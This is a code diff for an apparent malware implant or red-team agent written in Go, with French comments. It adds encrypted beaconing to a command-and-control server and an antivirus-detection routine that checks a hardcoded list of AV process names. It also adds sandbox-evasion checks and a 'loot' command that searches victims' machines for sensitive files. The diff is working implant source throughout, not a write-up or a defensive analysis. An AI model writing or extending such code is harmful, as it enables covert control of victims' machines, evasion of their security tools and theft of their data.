@@ -10,6 +10,9 @@ import (
 	"runtime"
 	"time"
 
+	"sOPown3d/agent/commands"
+	"sOPown3d/agent/crypto"
+	"sOPown3d/agent/evasion"
 	"sOPown3d/agent/persistence"
 	"sOPown3d/shared"
 )
@@ -91,18 +94,47 @@ func gatherSystemInfo() shared.AgentInfo {
 	}
 }
 
-// Envoyer beacon
+// Envoyer beacon CHIFFRÉ
 func sendBeacon(url string, info shared.AgentInfo) *shared.Command {
+	// 1. Convertir infos en JSON
 	jsonData, _ := json.Marshal(info)
 
-	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
+	// 2. Chiffrer le JSON
+	encryptedData, err := crypto.Encrypt(string(jsonData))
+	if err != nil {
+		fmt.Printf("⚠️ Erreur chiffrement: %v\n", err)
+		return nil
+	}
+
+	// 3. Créer message chiffré
+	encryptedMsg := shared.EncryptedMessage{
+		Data: encryptedData,
+	}
+
+	// 4. Envoyer
+	msgData, _ := json.Marshal(encryptedMsg)
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(msgData))
+
 	if err != nil {
 		return nil
 	}
 	defer resp.Body.Close()
 
+	// 5. Lire réponse (chiffrée)
+	var response shared.EncryptedMessage
+	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
+		return nil
+	}
+
+	// 6. Déchiffrer la réponse
+	decrypted, err := crypto.Decrypt(response.Data)
+	if err != nil {
+		return nil
+	}
+
+	// 7. Parser la commande
 	var cmd shared.Command
-	if err := json.NewDecoder(resp.Body).Decode(&cmd); err == nil {
+	if err := json.Unmarshal([]byte(decrypted), &cmd); err == nil {
 		if cmd.Action != "" {
 			return &cmd
 		}
@@ -144,6 +176,48 @@ func executeCommand(cmd *shared.Command) {
 		} else {
 			fmt.Println("  ✗ Non persistant")
 		}
+
+	case "checkav":
+		fmt.Println("🛡️ Analyse antivirus...")
+
+		// Liste des processus AV courants
+		avProcesses := []string{
+			"MsMpEng.exe",  // Windows Defender
+			"avguard.exe",  // Avira
+			"avg.exe",      // AVG
+			"avastsvc.exe", // Avast
+			"bdagent.exe",  // BitDefender
+			"ccSvcHst.exe", // Norton
+			"ekrn.exe",     // ESET
+			"McAfee.exe",   // McAfee
+			"V3Svc.exe",    // AhnLab
+			"Sophos.exe",   // Sophos
+		}
+
+		detected := false
+		for _, av := range avProcesses {
+			// Vérifier si le process tourne
+			cmd := exec.Command("tasklist", "/fi", "imagename eq "+av)
+			if output, err := cmd.CombinedOutput(); err == nil {
+				if len(output) > 0 && !bytes.Contains(output, []byte("Aucune tâche")) {
+					fmt.Printf("  ⚠️ Détecté: %s\n", av)
+					detected = true
+				}
+			}
+		}
+
+		if !detected {
+			fmt.Println("  ✅ Aucun AV détecté")
+		}
+
+		// Vérifier sandbox
+		if evasion.IsSandbox() {
+			fmt.Println("  ⚠️ Environnement sandbox détecté!")
+		}
+
+	case "loot":
+		fmt.Println("\n💰 Commande LOOT reçue!")
+		commands.SearchSensitiveFiles()
 
 	default:
 		fmt.Printf("Commande inconnue: %s\n", cmd.Action)
